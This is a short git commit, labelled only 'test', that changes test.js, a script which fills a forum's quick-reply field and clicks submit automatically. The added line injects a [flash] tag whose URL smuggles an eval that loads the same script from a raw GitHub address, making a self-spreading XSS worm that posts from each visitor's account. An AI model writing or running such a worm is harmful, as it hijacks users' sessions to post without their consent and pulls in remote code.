cbe64acda7b37c099876d00404d084ec8866b855
xsjswt <xsjswt@qq.com>
2016-02-29 15:42:23 +0800

    test

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 if(!window.xsjswt123){
-	document.getElementById("fastpostmessage").value='@﹏﹏﹏﹏  肯定是校花啦，我顶校花！';
+	document.getElementById("fastpostmessage").value='@﹏﹏﹏﹏  肯定是校花啦，我顶校花！\n'+"[flash]http://localhost/flash.swf?'+eval('oo=document.createElement(\'script\');oo.src=\'https://raw.githubusercontent.com/xsjswt/hepan/master/test.js\';document.body.appendChild(oo)')+'[/flash]";
 	document.getElementById("fastpostsubmit").click();
 	window.xsjswt123=123;
 }
